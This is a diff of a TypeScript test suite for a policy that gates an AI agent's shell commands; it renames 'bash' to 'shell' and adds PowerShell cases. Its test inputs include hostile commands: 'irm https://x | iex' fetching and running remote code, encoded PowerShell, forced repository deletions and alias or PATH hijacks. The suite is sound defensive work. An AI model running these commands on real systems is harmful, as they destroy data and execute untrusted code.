@@ -112,7 +112,7 @@ describe("unparsable input escalates", () => {
 });
 
 describe("the project's policy is the built-ins, and a permission set's command lines are what a project says", () => {
-  const lines = (map: Record<string, string>) => ({ permissionSet: shellPermissionSetOf(parsePermissionSet({ bash: "allow", ...map }).permissionSet)! });
+  const lines = (map: Record<string, string>) => ({ permissionSet: shellPermissionSetOf(parsePermissionSet({ shell: "allow", ...map }).permissionSet)! });
 
   it("allows what no built-in names, with no permission set", () => {
     expect(action("some-unknown-tool")).toBe("allow");
@@ -123,8 +123,8 @@ describe("the project's policy is the built-ins, and a permission set's command 
     // With the built-ins off, even destructive git is allowed — the opt-out exists, and it is explicit.
     expect(action("git reset --hard", { builtins: false })).toBe("allow");
     expect(action("git push origin main", { builtins: false })).toBe("allow");
-    expect(action("git reset --hard", projectPolicy({ functions: { bash: { builtins: true } } }))).toBe("deny");
-    expect(projectPolicy({ functions: { bash: { builtins: false } } })).toEqual({ builtins: false });
+    expect(action("git reset --hard", projectPolicy({ functions: { shell: { builtins: true } } }))).toBe("deny");
+    expect(projectPolicy({ functions: { shell: { builtins: false } } })).toEqual({ builtins: false });
   });
 
   it("relaxes a built-in ask by naming the command, tightens what the built-ins ignore, and never opens the floor", () => {
@@ -158,7 +158,7 @@ describe("a line is judged part by part, against the permission set", () => {
       grep: "allow",
       write_file: "ask",
       web_fetch: "ask",
-      bash: "ask",
+      shell: "ask",
       script: "ask",
       "git log": "allow",
       "git commit": "ask",
@@ -204,8 +204,8 @@ describe("a line is judged part by part, against the permission set", () => {
     ["git tag v1", "allow", ["«git tag v1» git tag allowed by permissionSet:git tag ~git tag~"]],
     ["git tag v1 --force", "deny", ["«git tag v1 --force» git tag --force denied by permissionSet:git tag --force ~git tag~--force~"]],
     // No entry for the subcommand or the program: the shell's own entry, and only the program is underlined.
-    ["git stash", "require_approval", ["«git stash» git stash asks by permissionSet:bash ~git~"]],
-    ["terraform plan -out tf.plan", "require_approval", ["«terraform plan -out tf.plan» terraform plan asks by permissionSet:bash ~terraform~"]],
+    ["git stash", "require_approval", ["«git stash» git stash asks by permissionSet:shell ~git~"]],
+    ["terraform plan -out tf.plan", "require_approval", ["«terraform plan -out tf.plan» terraform plan asks by permissionSet:shell ~terraform~"]],
     [
       "find . -name '*.tmp' -exec rm {} \\; | tee cleaned.log > /dev/null",
       "require_approval",
@@ -230,7 +230,7 @@ describe("a line is judged part by part, against the permission set", () => {
         "«python x.py» script asks by permissionSet:script ~python x.py~",
         "«node x.js» script asks by permissionSet:script ~node x.js~",
         "«make all» script asks by permissionSet:script ~make all~",
-        "«python -m pytest» python pytest asks by permissionSet:bash ~python~",
+        "«python -m pytest» python pytest asks by permissionSet:shell ~python~",
       ],
     ],
     // Embedders are opened, and the parts keep their place in the ORIGINAL line.
@@ -262,7 +262,7 @@ describe("a line is judged part by part, against the permission set", () => {
     ["GIT_EXTERNAL_DIFF=./x git log", "require_approval", ["«GIT_EXTERNAL_DIFF=./x git log» git log asks by parser ~git~"]],
     ["env NODE_OPTIONS=--require=./x.js git log", "require_approval", ["«git log» git log asks by parser ~git~"]],
     ["export PATH=/tmp/x; git log", "require_approval", ["«export PATH=/tmp/x» export asks by parser ~export~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
-    ["PATH=/tmp/x; git log", "require_approval", ["«PATH=/tmp/x» bash asks by parser ~PATH=/tmp/x~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
+    ["PATH=/tmp/x; git log", "require_approval", ["«PATH=/tmp/x» shell asks by parser ~PATH=/tmp/x~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
     ["printf -v GIT_DIR x; hash -p /tmp/git git", "require_approval", ["«printf -v GIT_DIR x» printf asks by parser ~printf~", "«hash -p /tmp/git git» hash asks by parser ~hash~"]],
     ["CI=1 NO_COLOR=1 LC_ALL=C git log", "allow", ["«CI=1 NO_COLOR=1 LC_ALL=C git log» git log allowed by permissionSet:git log ~git log~"]],
     ["x=1; read -r line && export NO_COLOR=1 && cat a.txt", "allow", ["«cat a.txt» read_file allowed by permissionSet:read_file ~cat~"]],
@@ -295,7 +295,30 @@ describe("a line is judged part by part, against the permission set", () => {
     ["Invoke-WebRequest -Uri https://example.com -OutFile x.zip", "require_approval", ["«Invoke-WebRequest -Uri https://example.com -OutFile x.zip» web_fetch asks by permissionSet:web_fetch ~Invoke-WebRequest~"]],
     [`powershell -Command "Remove-Item x; git rm y"`, "deny", ["«Remove-Item x» write_file asks by permissionSet:write_file ~Remove-Item~", "«git rm y» git rm denied by permissionSet:git rm ~git rm~"]],
     [".\\build.ps1 -Release; npm run build", "require_approval", ["«.\\build.ps1 -Release» script asks by permissionSet:script ~.\\build.ps1 -Release~", "«npm run build» script asks by permissionSet:script ~npm run build~"]],
-    ["terraform plan -out tf.plan", "require_approval", ["«terraform plan -out tf.plan» terraform plan asks by permissionSet:bash ~terraform~"]],
+    ["terraform plan -out tf.plan", "require_approval", ["«terraform plan -out tf.plan» terraform plan asks by permissionSet:shell ~terraform~"]],
+    // An alias is the cmdlet it runs; what is underlined is the word the line wrote.
+    ["rm -Recurse build", "require_approval", ["«rm -Recurse build» write_file asks by permissionSet:write_file ~rm~"]],
+    // Reading a property of every object is no request; calling a method on every one is code.
+    ["gci -Recurse src | % FullName", "allow", ["«gci -Recurse src» glob allowed by permissionSet:glob ~gci~"]],
+    ["Get-ChildItem *.log | % Delete", "require_approval", ["«Get-ChildItem *.log» glob allowed by permissionSet:glob ~Get-ChildItem~", "«% Delete» script asks by permissionSet:script ~% Delete~"]],
+    [`[IO.File]::WriteAllText("a.txt", "b")`, "require_approval", [`«[IO.File]::WriteAllText("a.txt", "b")» script asks by permissionSet:script ~[IO.File]::WriteAllText("a.txt", "b")~`]],
+    // A variable that reaches past the line, and a name pointed elsewhere, are not vouched for.
+    [`$env:PATH = "C:\\x"; git log`, "require_approval", ["«$env:PATH» shell asks by parser ~$env:PATH~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
+    ["Set-Alias git Remove-Item; git log", "require_approval", ["«Set-Alias git Remove-Item» set-alias asks by parser ~Set-Alias~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
+    // Every place PowerShell runs code is judged: conditions, blocks, subexpressions in strings.
+    ["if (Test-Path x) { Get-Content x } else { git log }", "allow", ["«Test-Path x» glob allowed by permissionSet:glob ~Test-Path~", "«Get-Content x» read_file allowed by permissionSet:read_file ~Get-Content~", "«git log» git log allowed by permissionSet:git log ~git log~"]],
+    [`Write-Output "$(git rm x)"`, "deny", ["«git rm x» git rm denied by permissionSet:git rm ~git rm~"]],
+    ["$out = git log; $out | Out-Null", "allow", ["«git log» git log allowed by permissionSet:git log ~git log~"]],
+    // Parameters cut short and arrays are read as PowerShell reads them.
+    ["Get-Content a.txt, b.txt | Out-File -FilePath c.txt", "require_approval", ["«Get-Content a.txt, b.txt» read_file allowed by permissionSet:read_file ~Get-Content~", "«Out-File -FilePath c.txt» write_file asks by permissionSet:write_file ~Out-File~"]],
+    // A cmdlet is its whole verb: `Install-Module` is `install_software` (decision 0018 §3), which this set
+    // does not hold, so its `other` answers — stricter than the built-in install ask.
+    ["Install-Module Pester", "deny", ["«Install-Module Pester» install_software denied by permissionSet:other ~Install-Module~"]],
+    ["iwr https://example.com -OutFile x.zip", "require_approval", ["«iwr https://example.com -OutFile x.zip» web_fetch asks by permissionSet:web_fetch ~iwr~"]],
+    // A line that is read and runs nothing outside the shell is no request at all.
+    ["$PSVersionTable.PSVersion; [IO.Path]::Combine('a', 'b'); 'x'.ToUpper()", "allow", []],
+    // cmd's own language inside, its switches no places.
+    [`cmd /c "del /f x.txt & type y.txt"`, "require_approval", ["«del /f x.txt» write_file asks by permissionSet:write_file ~del~", "«type y.txt» read_file allowed by permissionSet:read_file ~type~"]],
   ])("PowerShell: %s ⇒ %s", (line, action, parts) => {
     expect(judged(line, "powershell")).toEqual({ action, parts });
   });
@@ -314,7 +337,7 @@ describe("a line is judged part by part, against the permission set", () => {
   });
 
   it("a line the parser cannot model asks, whatever the permission set allows — and a deny beside it stands", () => {
-    const open = shellPermissionSetOf(parsePermissionSet({ bash: "allow", other: "allow" }).permissionSet)!;
+    const open = shellPermissionSetOf(parsePermissionSet({ shell: "allow", other: "allow" }).permissionSet)!;
     for (const line of [`git commit -m "unterminated`, "$CMD --hard", "git $(cat x) --hard", `bash -c "echo 'oops"`, "case $x in a) ls;; esac"]) {
       const decision = decideCommand(OPEN, line, "posix", { permissionSet: open });
       expect(decision.action, line).toBe("require_approval");
@@ -325,7 +348,7 @@ describe("a line is judged part by part, against the permission set", () => {
   });
 
   it("keeps the destructive floor and `.jaira/` above EVERY permission set, however the command is dressed", () => {
-    const open = shellPermissionSetOf(parsePermissionSet({ bash: "allow", write_file: "allow", read_file: "allow", script: "allow", git: "allow", "git reset": "allow", rm: "allow", other: "allow" }).permissionSet)!;
+    const open = shellPermissionSetOf(parsePermissionSet({ shell: "allow", write_file: "allow", read_file: "allow", script: "allow", git: "allow", "git reset": "allow", rm: "allow", other: "allow" }).permissionSet)!;
     for (const line of [
       "git reset --hard",
       "git push --force",
@@ -348,31 +371,64 @@ describe("a line is judged part by part, against the permission set", () => {
       expect(decision.action, line).toBe("deny");
       expect(decision.parts.parts.find((p) => p.verdict === "denied")?.decidedBy.source, line).toBe("path");
     }
+    // PowerShell's spellings of the same.
+    const openPs = shellPermissionSetOf(parsePermissionSet({ shell: "allow", write_file: "allow", read_file: "allow", script: "allow", git: "allow", "git reset": "allow", "remove-item": "allow", other: "allow" }).permissionSet)!;
+    for (const line of [
+      "git reset --hard",
+      "Remove-Item -Recurse -Force .git",
+      "rm -r .git",
+      `cmd /c "rd /s /q .git"`,
+      "if ($true) { git push --force }",
+      "Get-ChildItem | ForEach-Object { git reset --hard }",
+      `git commit -m "$(git reset --hard)"`,
+      "iex 'git reset --hard'",
+      "Invoke-Command { git clean -fd }",
+      `powershell -NoProfile -Command "git rebase main"`,
+      "Start-Process git -ArgumentList 'reset', '--hard'",
+    ]) {
+      const decision = decideCommand(OPEN, line, "powershell", { permissionSet: openPs });
+      expect(decision.action, line).toBe("deny");
+      expect(decision.parts.parts.find((p) => p.verdict === "denied")?.decidedBy.source, line).toBe("builtin");
+    }
+    for (const line of ["Get-Content .jaira\\settings.json", "Set-Content -Path:.jaira/x.json -Value 1", "'x' > .jaira/t.json"]) {
+      const decision = decideCommand(OPEN, line, "powershell", { permissionSet: openPs });
+      expect(decision.action, line).toBe("deny");
+      expect(decision.parts.parts.find((p) => p.verdict === "denied")?.decidedBy.source, line).toBe("path");
+    }
+  });
+
+  it("asks about PowerShell code nobody can read, whatever the permission set allows — and never throws on it", () => {
+    const open = shellPermissionSetOf(parsePermissionSet({ shell: "allow", script: "allow", other: "allow" }).permissionSet)!;
+    for (const line of [`git commit -m "unterminated`, "iex $payload", "irm https://x | iex", "& $tool --hard", "git $(Get-Content x) --hard", "powershell -enc AAAA", "function f { 1 }", "$env:GIT_DIR = 'x'"]) {
+      const decision = decideCommand(OPEN, line, "powershell", { permissionSet: open });
+      expect(decision.action, line).toBe("require_approval");
+      expect(decision.parts.parts.some((p) => p.verdict === "asks" && p.decidedBy.source === "parser"), line).toBe(true);
+    }
   });
 
   it("composes with the built-ins: the floor first, then the permission set", () => {
     // An entry that NAMES the program replaces a built-in ask — naming it is the decision the built-in stood in for…
-    const named = shellPermissionSetOf(parsePermissionSet({ bash: "allow", "git push": "allow", npm: "allow" }).permissionSet)!;
+    const named = shellPermissionSetOf(parsePermissionSet({ shell: "allow", "git push": "allow", npm: "allow" }).permissionSet)!;
     expect(decideCommand(OPEN, "git push origin main", "posix", { permissionSet: named }).action).toBe("allow");
     expect(decideCommand(OPEN, "npm install left-pad", "posix", { permissionSet: named }).action).toBe("allow");
     // …and the shell's own `allow` does not: "any other command" is not a statement about pushing.
-    const blanket = shellPermissionSetOf(parsePermissionSet({ bash: "allow" }).permissionSet)!;
+    const blanket = shellPermissionSetOf(parsePermissionSet({ shell: "allow" }).permissionSet)!;
     expect(decideCommand(OPEN, "git push origin main", "posix", { permissionSet: blanket }).action).toBe("require_approval");
     expect(decideCommand(OPEN, "git status", "posix", { permissionSet: blanket }).action).toBe("allow");
     // A command nothing names answers to the shell's own line, the built-ins still above it.
-    expect(decideCommand(OPEN, "tsc --noEmit", "posix", { permissionSet: shellPermissionSetOf(parsePermissionSet({ bash: "deny", "git status": "allow" }).permissionSet)! }).action).toBe("deny");
+    expect(decideCommand(OPEN, "tsc --noEmit", "posix", { permissionSet: shellPermissionSetOf(parsePermissionSet({ shell: "deny", "git status": "allow" }).permissionSet)! }).action).toBe("deny");
     expect(decideCommand(OPEN, "tsc --noEmit", "posix", { permissionSet: blanket }).action).toBe("allow");
     // With the built-ins off, the permission set is the only authority.
     expect(decideCommand({ builtins: false }, "git push origin main", "posix", { permissionSet: blanket }).action).toBe("allow");
-    expect(decideCommand({ builtins: false }, "git reset --hard", "posix", { permissionSet: shellPermissionSetOf(parsePermissionSet({ bash: "allow", "git reset": "ask" }).permissionSet)! }).action).toBe("require_approval");
+    expect(decideCommand({ builtins: false }, "git reset --hard", "posix", { permissionSet: shellPermissionSetOf(parsePermissionSet({ shell: "allow", "git reset": "ask" }).permissionSet)! }).action).toBe("require_approval");
     // `smart` on an entry defers to the command policy.
-    const deferring = shellPermissionSetOf(parsePermissionSet({ bash: "smart" }).permissionSet)!;
+    const deferring = shellPermissionSetOf(parsePermissionSet({ shell: "smart" }).permissionSet)!;
     expect(decideCommand(OPEN, "git status", "posix", { permissionSet: deferring }).action).toBe("allow");
     expect(decideCommand(OPEN, "git push", "posix", { permissionSet: deferring }).action).toBe("require_approval");
     // A subject the permission set does not hold is not offered: it asks.
     expect(judged("rm x", "posix", OPEN, blanket).parts).toEqual(["«rm x» write_file asks by permissionSet ~rm~"]);
     // An explicit entry for a utility's PROGRAM beats the standard tool it would otherwise be.
-    expect(judged("rm x", "posix", OPEN, shellPermissionSetOf(parsePermissionSet({ bash: "allow", write_file: "allow", rm: "deny" }).permissionSet)!).parts).toEqual(["«rm x» write_file denied by permissionSet:rm ~rm~"]);
+    expect(judged("rm x", "posix", OPEN, shellPermissionSetOf(parsePermissionSet({ shell: "allow", write_file: "allow", rm: "deny" }).permissionSet)!).parts).toEqual(["«rm x» write_file denied by permissionSet:rm ~rm~"]);
   });
 
   it("with no permission set a line answers to the built-ins alone, and still comes apart", () => {
@@ -421,7 +477,7 @@ describe("isDeniedPath", () => {
 // --- the compiled ExecPolicy -------------------------------------------------
 
 const request = (input: Record<string, unknown>): PermissionRequest =>
-  ({ tool: "bash", input: input as never, sessionId: "s1" });
+  ({ tool: "shell", input: input as never, sessionId: "s1" });
 
 /** Invoke a compiled policy's smart approver for a tool. */
 async function verdict(policy: JairaPolicy, tool: string, input: Record<string, unknown>, audit?: PolicyAuditEntry[]) {
@@ -434,28 +490,28 @@ async function verdict(policy: JairaPolicy, tool: string, input: Record<string, 
 describe("compilePolicy", () => {
   it("puts command tools in smart mode, and says nothing of any other tool", () => {
     const compiled = compilePolicy(OPEN);
-    expect(compiled.baseline?.tools?.["bash"]).toBe("smart");
+    expect(compiled.baseline?.tools?.["shell"]).toBe("smart");
     expect(compiled.baseline?.tools?.["write_file"]).toBeUndefined();
     expect(compiled.baseline?.default).toBeUndefined();
     expect(compiled.baseline?.profile).toBeUndefined();
-    expect(Object.keys(compiled.smart ?? {})).toContain("bash");
+    expect(Object.keys(compiled.smart ?? {})).toContain("shell");
   });
 
   it("maps policy actions onto smart verdicts", async () => {
-    expect(await verdict(OPEN, "bash", { command: "git status" })).toBe("allow");
-    expect(await verdict(OPEN, "bash", { command: "git reset --hard" })).toBe("deny");
+    expect(await verdict(OPEN, "shell", { command: "git status" })).toBe("allow");
+    expect(await verdict(OPEN, "shell", { command: "git reset --hard" })).toBe("deny");
     // require_approval escalates to the human gate.
-    expect(await verdict(OPEN, "bash", { command: "git push" })).toBe("ask");
+    expect(await verdict(OPEN, "shell", { command: "git push" })).toBe("ask");
   });
 
   it("denies .jaira/ by path, for command and file tools alike", async () => {
-    expect(await verdict(OPEN, "bash", { command: "cat .jaira/settings.json" })).toBe("deny");
+    expect(await verdict(OPEN, "shell", { command: "cat .jaira/settings.json" })).toBe("deny");
     expect(await verdict(OPEN, "show_artifact", { path: ".jaira/tasks/x.json", content: "x" })).toBe("deny");
     expect(await verdict(OPEN, "show_artifact", { path: "src/x.html", content: "x" })).toBe("allow");
   });
 
   it("escalates when a command tool has no command to read", async () => {
-    expect(await verdict(OPEN, "bash", { unexpected: 1 })).toBe("ask");
+    expect(await verdict(OPEN, "shell", { unexpected: 1 })).toBe("ask");
   });
 
   describe("a produced artifact is judged by its size", () => {
@@ -518,9 +574,9 @@ describe("compilePolicy", () => {
 
   it("records every decision for the audit trail (§10.2)", async () => {
     const audit: PolicyAuditEntry[] = [];
-    await verdict(OPEN, "bash", { command: "git push --force" }, audit);
+    await verdict(OPEN, "shell", { command: "git push --force" }, audit);
     expect(audit).toHaveLength(1);
-    expect(audit[0]).toMatchObject({ tool: "bash", command: "git push --force", action: "deny", sessionId: "s1" });
+    expect(audit[0]).toMatchObject({ tool: "shell", command: "git push --force", action: "deny", sessionId: "s1" });
     expect(audit[0]!.parsed).toMatchObject({ program: "git", subcommand: "push" });
     expect(audit[0]!.reason).toMatch(/force push/);
   });
@@ -530,8 +586,8 @@ describe("compilePolicy", () => {
     // syntax is unmodellable, so it escalates on Windows…
     const windows = compilePolicy(OPEN, { execEnv: "windows" });
     const wsl = compilePolicy(OPEN, { execEnv: { wsl: "Ubuntu" } });
-    expect(windows.smart?.["bash"]).toBeDefined();
-    expect(wsl.smart?.["bash"]).toBeDefined();
+    expect(windows.smart?.["shell"]).toBeDefined();
+    expect(wsl.smart?.["shell"]).toBeDefined();
     // …which is observable through decideCommand's dialect handling.
     expect(decideCommand(OPEN, "git $(cat x)", "powershell").action).toBe("require_approval");
     expect(decideCommand(OPEN, "git status", "posix").action).toBe("allow");
@@ -552,7 +608,7 @@ describe("policyCanEscalate", () => {
  * in the runner's place on the line, each saying which runner it was reached through.
  */
 describe("a package script, judged by what it runs", () => {
-  const permissionSet = shellPermissionSetOf(parsePermissionSet({ read_file: "allow", bash: "deny", eslint: "allow", "eslint --fix": "deny", vitest: "allow", other: "deny" }).permissionSet)!;
+  const permissionSet = shellPermissionSetOf(parsePermissionSet({ read_file: "allow", shell: "deny", eslint: "allow", "eslint --fix": "deny", vitest: "allow", other: "deny" }).permissionSet)!;
   const repo = { dir: "/repo", scripts: { pretest: "eslint .", test: "vitest run", "lint:fix": "eslint --fix ." } };
   const packages = { at: (dir: string) => (dir === "/repo" ? repo : undefined), workspacesOf: () => [] };
   const decide = (line: string) => decideCommand({}, line, "posix", { permissionSet, root: "/repo", packages });
@@ -580,7 +636,7 @@ describe("a package script, judged by what it runs", () => {
  * no gate.
  */
 describe("a command runner's gate", () => {
-  const set = (lines: Record<string, unknown>) => shellPermissionSetOf(parsePermissionSet({ read_file: "allow", bash: "deny", "git status": "allow", other: "deny", ...lines }).permissionSet)!;
+  const set = (lines: Record<string, unknown>) => shellPermissionSetOf(parsePermissionSet({ read_file: "allow", shell: "deny", "git status": "allow", other: "deny", ...lines }).permissionSet)!;
   const GATED = set({ "runner:*": "allow", "runner:sudo": "deny", "runner:npm": "allow", "npm run build": "allow", script: "deny" });
   const repo = { dir: "/repo", scripts: { lint: "git status", build: "rm -rf dist" } };
   const makefile = { path: "/repo/Makefile", text: "check:\n\tgit status\n" };
@@ -600,7 +656,7 @@ describe("a command runner's gate", () => {
     expect(judged("npm run lint")).toEqual({ action: "allow", parts: ["«npm run lint» runner:npm allowed by runner:npm", "«git status» git status allowed by git status"] });
     expect(judged(`bash -c "git status"`)).toEqual({ action: "allow", parts: [`«bash -c "git status"» runner:bash allowed by runner:*`, "«git status» git status allowed by git status"] });
     // Nothing inside: the command itself, which no line names.
-    expect(judged("npm install")).toEqual({ action: "deny", parts: ["«npm install» runner:npm allowed by runner:npm", "«npm install» npm install denied by bash"] });
+    expect(judged("npm install")).toEqual({ action: "deny", parts: ["«npm install» runner:npm allowed by runner:npm", "«npm install» npm install denied by shell"] });
   });
 
   it("refuses a runner its gate denies without looking inside", () => {
